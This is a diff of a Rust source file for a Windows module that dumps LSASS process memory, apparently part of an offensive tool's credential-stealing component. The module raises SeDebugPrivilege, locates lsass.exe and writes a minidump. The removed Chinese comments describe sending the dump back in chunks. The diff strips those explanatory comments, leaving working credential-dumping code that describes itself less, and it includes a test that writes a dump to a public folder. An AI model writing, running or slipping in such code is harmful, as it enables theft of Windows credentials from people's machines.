@@ -1,9 +1,4 @@
-//! LSASS 内存转储：提 SeDebugPrivilege → 按名定位 lsass.exe → MiniDumpWriteDump。
-//! 转储文件落盘后由文件模块分块回传。需要 SYSTEM 或 SeDebugPrivilege 权限。
-
 #![allow(non_snake_case)]
-// 本模块依赖 Windows 专属 FFI（lsass_ffi），非 Windows 平台不编译
-// （creds lib.rs 已按平台门控）。
 #![cfg(target_os = "windows")]
 
 use std::ffi::c_void;
@@ -51,7 +46,6 @@ fn wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
-/// 提 SeDebugPrivilege。
 unsafe fn enable_se_debug() {
     let mut token: isize = 0;
     if lsass_ffi::OpenProcessToken(
@@ -82,7 +76,6 @@ unsafe fn enable_se_debug() {
     lsass_ffi::CloseHandle(token);
 }
 
-/// 按进程名查找 PID。
 unsafe fn find_pid_by_name(name: &str) -> Option<u32> {
     let snap = lsass_ffi::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snap == INVALID_HANDLE {
@@ -109,7 +102,6 @@ unsafe fn find_pid_by_name(name: &str) -> Option<u32> {
     found
 }
 
-/// 转储 LSASS 到 `dump_path`，返回 JSON。
 pub fn dump_lsass(dump_path: &str) -> String {
     unsafe {
         enable_se_debug();
@@ -164,7 +156,6 @@ mod tests {
 
     #[test]
     fn dump_returns_json_without_crash() {
-        // 普通权限下 lsass 通常无法打开，验证失败路径不崩溃且返回合法 JSON。
         let r = dump_lsass("C:\\Users\\Public\\lsass_test.dmp");
         assert!(r.starts_with('{'), "expected JSON, got: {r}");
     }
